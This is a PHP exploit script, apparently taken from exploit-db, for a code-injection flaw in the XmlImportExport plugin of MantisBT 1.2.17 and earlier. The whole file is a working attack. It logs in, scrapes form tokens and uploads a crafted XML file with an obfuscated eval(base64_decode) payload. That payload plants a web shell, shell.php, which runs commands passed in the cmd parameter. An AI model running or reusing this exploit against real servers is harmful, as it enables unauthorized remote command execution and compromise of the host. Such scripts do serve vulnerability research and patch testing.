<?php

/**
 * MantisBT <= 1.2.17 XmlImportExport Plugin PHP Code Injection 
 * Exploit : www.exploit-db.com/exploits/35283
 * Written by xD4rker
 */

$base_url = "http://127.0.0.1/mantisbt/";
$user = "administrator";
$pass = "root";

$payload = '$z=fopen("./shell.php", "w");fwrite($z,"<?php eval(base64_decode(\'cGFzc3RocnUoJF9HRVRbJ2NtZCddKTs=\')); ?>");fclose($z)';

function cURL($base_url, $session_cookie, $data=null) {

	// Headers init

	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	$headers[] = "Connection: Keep-Alive";
	$headers[] = "Content-type: application/x-www-form-urlencoded;charset=UTF-8";

	$user_agent = "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6";
	$compression = "gzip,deflate";

	$ch = curl_init($base_url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_ENCODING, $compression);

	if($data) {
		$post_string = http_build_query($data, '', '&');
		curl_setopt($ch,CURLOPT_POST, count($data));
		curl_setopt($ch,CURLOPT_POSTFIELDS, $post_string);
	}

	if($session_cookie)
		curl_setopt($ch, CURLOPT_COOKIE, $session_cookie);

	curl_setopt($ch, CURLOPT_TIMEOUT, 900);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	// curl_setopt($ch, CURLOPT_PROXY, "server:port"); // uncomment this if you're going to use a proxy
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

function get_session_cookie($base_url, $user, $pass) {

	$post_data 	= array("username" => $user, "password" => $pass);
	$login_url = $base_url."login.php";
	echo "[+] Checking access to MantisBT...\n";
	$data = cURL($login_url, null, $post_data);

	if(preg_match("/^HTTP\/.*\s404 Not Found/", $data)) {
		echo "[-] Error while accessing MantisBT\n";
		die("[-] Exploit failed, aborting\n");
	}

	if(preg_match("#error=1#", $data)) {
		echo "[-] Failed to login\n";
		die("[-] Exploit failed, aborting\n");
	}

	echo "[+] Logged in\n";
	preg_match_all("/^Set-Cookie:\s*([^;]*)/mi", $data, $match);
	$session_cookie = $match[1][0]."; ".$match[1][1]."; MANTIS_secure_session=1; MANTIS_PROJECT_COOKIE=1";

	return $session_cookie;
}

function get_ids($base_url, $session_cookie) {

	$url = $base_url."plugin.php?page=XmlImportExport/import";
	$data = cURL($url, $session_cookie, null);

	if (!preg_match("#name=\"project_id\" value=\"(.*?)\"#", $data, $proj_match)) {
		echo "[-] Error while trying to retrieve project id value\n";
		die("[-] Exploit failed, aborting\n");
	}
	$project_id = $proj_match[1];

	if (!preg_match("#<select name=\"defaultcategory\">(\n|\r\n)<option value=\"(.*?)\" selected=\"selected\" >\(select\)</option>.*<option value=\"1\">\[All Projects\] (.*?)</option>#", $data, $categ_match)) {
		echo "[-] Error while trying to retrieve category id/name value\n";
		die("[-] Exploit failed, aborting\n");
	}
	$category_id = $categ_match[2];
	$category_name = $categ_match[3];

	if (!preg_match("#name=\"max_file_size\" value=\"(.*?)\"#", $data, $max_match)) {
		echo "[-] Error while trying to retrieve max file size value\n";
		die("[-] Exploit failed, aborting\n");
	}
	$max_file_size = $max_match[1];

	if (!preg_match("#name=\"step\" value=\"(.*?)\"#", $data, $step_match)) {
		echo "[-] Error while trying to retrieve step id value\n";
		die("[-] Exploit failed, aborting\n");
	}
	$step = $step_match[1];

	if (!preg_match("#name=\"bug_actiongroup_DELETE_token\" value=\"(.*?)\"#", $data, $token_match)) {
		echo "[-] Error while trying to retrieve CSRF token\n";
		die("[-] Exploit failed, aborting\n");
	}
	$csrf_token= $token_match[1];

	$info = array(

		"project_id" => $project_id, 
		"category_id" => $category_id, 
		"category_name" => $category_name, 
		"max_file_size" => $max_file_size, 
		"step" => $step,
		"csrf_token" => $csrf_token

		);

	return $info;

}

function upload_xml($base_url, $payload, $user, $pass) {

	$session_cookie = get_session_cookie($base_url, $user, $pass);

	$info = get_ids($base_url, $session_cookie);
	$project_id = $info['project_id'];
	$category_id = $info['category_id'];
	$category_name = $info['category_name'];
	$max_file_size = $info['max_file_size'];
	$step = $info['step'];
	$csrf_token = $info['$csrf_token'];

	$rand_num = rand(1,9);
	$rand_text = substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 20);

	$payload_b64 = base64_encode($payload);

	$xml = 
'<mantis version="1.2.17" urlbase="http://localhost/" issuelink="${eval(base64_decode('.$payload_b64.'))}}" notelink="~" format="1">
    <issue>
        <id>'.$rand_num.'</id>
        <project id="'.$project_id.'">'.$rand_text.'</project>
        <reporter id="'.$rand_num.'">'.$rand_text.'</reporter>
        <priority id="30">normal</priority>
        <severity id="50">minor</severity>
        <reproducibility id="70">have not tried</reproducibility>
        <status id="'.$rand_num.'">new</status>
        <resolution id="'.$rand_num.'">open</resolution>
        <projection id="'.$rand_num.'">none</projection>
        <category id="'.$category_id.'">'.$category_name.'</category>
        <date_submitted>1415492267</date_submitted>
        <last_updated>1415507582</last_updated>
        <eta id="'.$rand_num.'">none</eta>
        <view_state id="'.$rand_num.'">public</view_state>
        <summary>'.$rand_text.'</summary>
        <due_date>1</due_date>
        <description>{${eval(base64_decode('.$payload_b64.'))}}1</description>
    </issue>
</mantis>';


	$file_fields = array("type" => "text/xml", "filename" => "test.xml", "content" => $xml);

	$data= "";

	$id = uniqid();
	$delimiter = "------WebKitFormBoundary".$id;

	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"plugin_xml_import_action_token\"\r\n\r\n";
	$data .= $csrf_token."\r\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"project_id\"\r\n\r\n";
	$data .= $project_id."\r\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"max_file_size\"\r\n\r\n";
	$data .= $max_file_size."\r\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"step\"\r\n\r\n";
	$data .= $step."\r\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"file\"; filename=\"".$file_fields["filename"]."\"\r\n";
	$data .= "Content-Type: ".$file_fields["type"]."\r\n\r\n";
	$data .= $file_fields["content"]."\r\n\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"strategy\"\r\n\r\n";
	$data .= "renumber\r\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"fallback\"\r\n\r\n";
	$data .= "link\r\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"keepcategory\"\r\n\r\n";
	$data .= "on\r\n";
	$data .= $delimiter."\r\n";
	$data .= "Content-Disposition: form-data; name=\"defaultcategory\"\r\n\r\n";
	$data .= $category_id."\r\n";
	$data .= $delimiter."--\r\n";

	$headers[] = "Connection: keep-alive";
	$headers[] = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary".$id;
	$headers[] = "Content-Length: ".strlen($data);
	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
	$headers[] = "Origin: http://127.0.0.1";
	$headers[] = "Referer: http://127.0.0.1/mantisbt/plugin.php?page=XmlImportExport/import";
	$headers[] = "Expect:";

	$user_agent = "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6";
	$compression = "gzip,deflate";

	echo "[+] Checking XmlImportExport plugin...\n";
	$plugin_page = cURL($base_url."plugin.php?page=XmlImportExport/import", $session_cookie, null);

	if (preg_match("#Plugin page not found#", $plugin_page)) {
		echo "[-] Error while trying to access XmlImportExport/import page...\n";
		die("[-] Exploit failed, aborting\n");
	}

	echo "[+] Sending payload...\n";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $base_url."plugin.php?page=XmlImportExport/import_action");
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_ENCODING, $compression);
	curl_setopt($ch, CURLOPT_COOKIE, $session_cookie);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$output = curl_exec($ch);
	echo "[+] Payload sent!\n";
	echo "[+] You can access the webshell from : ".$base_url."shell.php?cmd=[cmd]\n";

}

upload_xml($base_url, $payload, $user, $pass);

?>
